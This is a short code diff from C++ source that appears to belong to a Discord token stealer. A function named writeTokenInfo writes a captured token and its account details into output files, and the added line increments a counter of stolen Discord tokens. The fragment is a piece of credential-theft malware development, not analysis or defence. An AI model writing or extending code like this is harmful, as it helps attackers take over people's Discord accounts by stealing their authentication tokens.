@@ -33,6 +33,8 @@ void Discord::writeTokenInfo(const std::string& token, const fs::path& root) {
     json resp = json::parse(request.first);
     std::ostringstream ss;
 
+    Counter::increaseDiscordTokens();
+
     try
     {
         ss << "TOKEN: " << token << "\n\n";
